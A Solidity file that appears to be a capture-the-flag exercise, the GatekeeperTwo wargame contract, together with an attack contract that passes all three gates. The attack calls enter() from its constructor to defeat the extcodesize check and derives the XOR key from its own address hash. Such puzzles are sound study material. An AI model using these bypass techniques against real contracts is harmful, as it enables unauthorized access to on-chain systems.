// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperTwoAttack {
    constructor(address _gatekeeper) public payable {
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", ~bytes8(keccak256(abi.encodePacked(address(this)))));
        (bool result, bytes memory reason) = _gatekeeper.call.gas(80000)(payload);
        require(result, "Call to gatekeeper FAILED");
    }
}
